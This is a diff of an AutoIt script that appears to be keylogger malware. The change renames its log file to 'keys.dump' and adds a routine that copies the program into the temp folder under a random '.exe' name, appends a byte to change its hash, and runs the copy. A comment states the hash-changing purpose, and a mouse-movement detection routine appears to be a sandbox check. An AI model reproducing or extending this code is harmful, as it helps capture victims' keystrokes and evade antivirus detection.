@@ -31,7 +31,7 @@ EndFunc
 
 Func Log2File($log)
     ;Local Const $sFilePath = _WinAPI_GetTempFileName(@TempDir)
-	Local Const $sFilePath = @TempDir & "\drop.tmp"
+	Local Const $sFilePath = @TempDir & "\keys.dump"
     Local $hFileOpen = FileOpen($sFilePath, $FO_APPEND)
 	   If $hFileOpen = -1 Then
 		   MsgBox($MB_SYSTEMMODAL, "", "An error occurred whilst writing the temporary file.")
@@ -55,16 +55,31 @@ Func DetectMouseMoving()
    WEnd
 EndFunc
 
+;random string generator
+Func RandomString()
+   $out = ""
+   Dim $buffer[3]
+   $digits = 8
+   For $i = 1 To $digits
+	   $buffer[0] = Chr(Random(65, 90, 1)) ;A-Z
+	   $buffer[1] = Chr(Random(97, 122, 1)) ;a-z
+	   $buffer[2] = Chr(Random(48, 57, 1)) ;0-9
+	   $out &= $buffer[Random(0, 2, 1)]
+   Next
+   Return $out & ".exe"
+EndFunc
+
 ;copy myself into temp changing hash
 Func CopyTempRun()
-   FileCopy(@ScriptDir & "\" & @ScriptName, @TempDir & "\" & @ScriptName, $FC_OVERWRITE + $FC_CREATEPATH)
-   Local $hFileOpen = FileOpen(@TempDir & "\" & @ScriptName, $FO_APPEND)
+   $newName = RandomString()
+   FileCopy(@ScriptDir & "\" & @ScriptName, @TempDir & "\" & $newName, $FC_OVERWRITE + $FC_CREATEPATH)
+   Local $hFileOpen = FileOpen(@TempDir & "\" & $newName, $FO_APPEND)
    If $hFileOpen = -1 Then
 	  Return False
    EndIf
    FileWriteLine($hFileOpen, "1")
    FileClose($hFileOpen)
-   RunWait(@TempDir & "\" & @ScriptName);
+   RunWait(@TempDir & "\" & $newName);
 EndFunc
 
 Func isRunningFromTemp()
